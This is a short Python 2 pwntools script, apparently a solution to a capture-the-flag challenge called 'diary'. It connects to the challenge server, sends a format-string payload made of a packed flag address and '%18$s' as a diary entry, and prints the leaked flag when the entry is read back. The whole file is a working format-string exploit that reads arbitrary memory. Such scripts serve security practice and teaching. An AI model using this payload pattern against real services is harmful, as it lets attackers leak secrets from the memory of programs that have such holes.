#!/bin/python2
from pwn import *
import itertools

def resp(r, msg):
    log.info('Sending: ' + repr(msg)) 
    r.send(msg + '\n')

FLAG = 0x804a0a0

#r = remote('localhost', 6501)
r = remote('diary.vuln.icec.tf', 6501)
print r.recvuntil('> ')
resp(r, '1')
print r.recvuntil(': ')
resp(r, p32(FLAG) + '.%18$s')
print r.recvuntil('> ')
resp(r, '2')
print r.recvline().split('.')[1]
